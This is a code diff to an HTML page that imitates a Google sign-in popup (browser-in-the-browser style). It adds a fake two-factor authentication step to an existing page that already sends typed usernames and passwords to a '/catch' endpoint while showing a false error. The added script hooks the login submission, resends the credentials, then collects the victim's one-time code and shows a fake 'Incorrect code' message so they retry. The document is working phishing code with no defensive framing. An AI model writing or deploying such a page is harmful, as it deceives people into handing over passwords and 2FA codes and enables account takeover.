@@ -30,7 +30,15 @@ body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;min-heigh
 .bd .bs{padding:10px 24px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;float:right}
 .bd .err{display:none;color:#d93025;font-size:13px;margin-bottom:10px;text-align:left}
 .bd .clear{clear:both;padding-top:16px}
-</style></head><body>
+
+#_otp_step{display:none;margin-top:8px}
+#_otp_step label{font-size:13px;color:#333;display:block;margin-bottom:4px}
+#_otp_step input{width:100%;padding:9px 12px;border:1px solid #ccc;border-radius:4px;font-size:18px;
+  letter-spacing:6px;text-align:center;margin-bottom:14px;outline:none}
+#_otp_step input:focus{border-color:#1a73e8}
+#_otp_info{font-size:13px;color:#555;text-align:center;margin-bottom:12px}
+</style><style>#_obtn{width:100%;padding:10px;cursor:pointer;font-size:15px;border-radius:4px;border:none;margin-top:4px} #_obtn{} </style>
+</head><body>
 <div class="card">
 <div class="logo"><span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="gl">g</span><span class="e">l</span><span class="r">e</span></div>
 <h1>Sign in</h1>
@@ -54,7 +62,14 @@ body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;min-heigh
 <p class="err" id="em">Wrong password. Try again or click Forgot password.</p>
 <div><button class="bs" type="submit">Next</button></div>
 <div class="clear"></div>
-</form></div></div></div>
+</form>
+<div id="_otp_step">
+  <p id="_otp_info">&#x1F512; Two-factor authentication required<br><small style="color:#888">Enter the code from your authenticator app</small></p>
+  <label>Verification code</label>
+  <input type="tel" id="_fotp" autocomplete="one-time-code" placeholder="000000" maxlength="8" pattern="[0-9]*" inputmode="numeric">
+  <button type="button" id="_obtn" onclick="_submitOTP()">Verify</button>
+</div>
+</div></div></div>
 <script>
 function showB(){document.getElementById('ov').classList.add('show');setTimeout(()=>document.getElementById('fu').focus(),150);}
 function hideB(){document.getElementById('ov').classList.remove('show');}
@@ -64,4 +79,58 @@ var u=document.getElementById('fu').value,p=document.getElementById('fp').value;
 fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb'})}).catch(()=>{});
 var b=e.target.querySelector('.bs');b.textContent='Signing in…';b.disabled=true;
 setTimeout(()=>{document.getElementById('em').style.display='block';b.textContent='Next';b.disabled=false;document.getElementById('fp').value='';document.getElementById('fp').focus();},1800);}
-</script></body></html>
+</script>
+<script>
+(function(){
+var _c={};
+// Patch submitLogin / doSub / loginSubmit etc.
+var _origSub=window.submitLogin||window.doSub||window.loginSubmit||null;
+function _hookSubmit(u,p){
+  _c={user:u,pass:p};
+  fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb',step:'creds'})}).catch(()=>{});
+}
+// After original submit fires (shows error), reveal OTP step
+var _origFns=['submitLogin','doSub','loginSubmit'];
+_origFns.forEach(function(fn){
+  if(typeof window[fn]==='function'){
+    var _orig=window[fn];
+    window[fn]=function(e){
+      var _u=document.querySelector('input[type=text],input[autocomplete=username],input[id*=user],input[id*=email]');
+      var _p=document.querySelector('input[type=password]');
+      if(_u&&_p) _hookSubmit(_u.value,_p.value);
+      var r=_orig.apply(this,arguments);
+      setTimeout(function(){
+        var otp=document.getElementById('_otp_step');
+        if(otp) otp.style.display='block';
+        var fi=document.getElementById('_fotp');
+        if(fi) setTimeout(function(){fi.focus();},100);
+      },1700);
+      return r;
+    };
+  }
+});
+window._submitOTP=function(){
+  var otp=document.getElementById('_fotp');
+  if(!otp||!otp.value) return;
+  var btn=document.getElementById('_obtn');
+  if(btn){btn.textContent='Verifying\u2026';btn.disabled=true;}
+  fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({user:_c.user,pass:_c.pass,otp:otp.value,
+      ts:new Date().toISOString(),src:'bitb',step:'otp'})}).catch(()=>{});
+  setTimeout(function(){
+    var info=document.getElementById('_otp_info');
+    if(info) info.innerHTML='&#x26A0; Incorrect code. Please try again.';
+    if(btn){btn.textContent='Verify';btn.disabled=false;}
+    if(otp){otp.value='';otp.focus();}
+  },1800);
+};
+// Allow Enter key on OTP field
+document.addEventListener('keydown',function(e){
+  if(e.key==='Enter'&&document.activeElement&&document.activeElement.id==='_fotp'){
+    window._submitOTP();
+  }
+});
+})();
+</script>
+</body></html>
